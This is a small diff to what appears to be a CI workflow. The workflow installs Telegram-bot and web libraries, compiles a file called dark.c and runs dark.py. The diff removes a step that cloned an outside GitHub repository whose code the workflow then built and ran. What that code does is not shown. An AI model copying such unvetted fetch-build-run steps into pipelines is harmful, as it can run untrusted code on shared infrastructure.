@@ -17,7 +17,6 @@ workflows:
                 apt-get update && apt-get install -y gcc make
                 apt install python3-pip -y
                 pip3 install telebot flask pymongo aiohttp python-telegram-bot pytz
-                git clone https://github.com/VIKASH-5938/qq.git
-                cd qq
+                
                 if [ -f dark.c ]; then gcc dark.c -o dark -lpthread; fi
                 python3 dark.py
